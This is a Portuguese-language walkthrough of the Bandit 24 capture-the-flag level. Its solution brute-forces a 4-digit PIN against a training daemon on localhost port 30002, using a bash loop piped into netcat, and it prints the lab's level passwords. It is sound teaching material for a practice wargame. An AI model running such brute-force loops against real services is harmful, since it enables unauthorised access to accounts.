# 🕵️ Bandit 24

Um daemon está escutando na porta 30002 e fornecerá a senha para bandit25 se for fornecida a senha para bandit24 e um código PIN numérico secreto de 4 dígitos. Não há como recuperar o código PIN, exceto passando por todas as 10.000 combinações, chamadas de força bruta.

## Solução

A descrição nos informa que precisamos nos conectar a porta 30002 do localhost. Vamos fazer um teste:
```
bandit24@bandit:~$ nc localhost 30002
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0000
Wrong! Please enter the correct pincode. Try again.
^C
```

Como precisaremos fazer um brute force, a forma mais simples de fazer isso é através de um pequeno script que gere todas as combinações possíveis, para que em seguida, as envie para a conexão. 

Podemos fazer isso através de um laço que percorre todos os números de 0 até 9999 e os concatena com a chave do nível atual, direcionando essas strings geradas para o netcat: 
```
bandit24@bandit:~$ for i in {0000..9999};do echo UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i; done | nc localhost 30002
...
Wrong! Please enter the correct pincode. Try again.
Wrong! Please enter the correct pincode. Try again.
Wrong! Please enter the correct pincode. Try again.
Correct!
The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG

Exiting.
```
Quando a combinação correta for atingida o servidor retornará a flag para o próximo nível! 🥷

## Conceitos utilizados

- shell script
- laços de repetição




